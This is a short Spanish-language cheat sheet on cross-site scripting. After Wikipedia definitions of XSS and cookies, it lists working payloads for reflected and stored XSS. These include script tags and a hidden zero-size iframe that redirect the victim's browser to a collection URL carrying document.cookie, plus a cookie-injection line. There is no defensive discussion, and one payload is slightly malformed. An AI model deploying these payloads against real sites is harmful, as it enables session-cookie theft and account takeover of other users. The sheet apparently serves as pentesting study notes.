# XSS

## Que es XSS

[https://es.wikipedia.org/wiki/Cross-site_scripting] (Wiki)

Una secuencia de comandos en sitios cruzados o Cross-site scripting (XSS por sus siglas en idioma inglés) es un tipo de vulnerabilidad informática o agujero de seguridad típico de las aplicaciones Web, que puede permitir a una tercera persona inyectar en páginas web visitadas por el usuario código JavaScript o en otro lenguaje similar


## COOKIE

[https://es.wikipedia.org/wiki/Cookie_(inform%C3%A1tica)] (Wiki)

El anglicismo cookie, usado también galleta o galleta informática, es un término que hace referencia a una pequeña información enviada por un sitio web y almacenada en el navegador del usuario, de manera que el sitio web puede consultar la actividad previa del navegador. Si se ha realizado un curso desde un inicio o una nueva aplicación se pueden realizar con la misma contraseña o no en su sistema:
1. Recordar accesos
2. Conocer información

## NO PERSISTENTE

__Cookies__

```javascript
console.log(document.cookie)
```

__URL__

```javascript
"><script> alert('123') </script>
```

__Recueprar Cookies__
```javascript
"><script> document.location='http://cookie.php?c='+document.cookie </script>
```


## PERSISTENTE

__Cookies__

```javascript
console.log(document.cookie)
```

__Almacenar__

```javascript
<script> alert('123') </script>
```

__Recueprar Cookies__

```javascript
<script> document.location='http://cookie.php?c='+document.cookie </script>
```

__Recueprar Cookies con Iframe__

```html
<iframe frameborder=0  height=0 width=0 src="javascript:void(document.location="http://cookie.php?c"+document.cookie)">
</iframe>
```

__Insertar Cookies__
	Insertar Cookies 
```javascript
javascript:void(document.cookie="asdasd")
```

## HERRAMIENTAS

https://www.asciitohex.com/

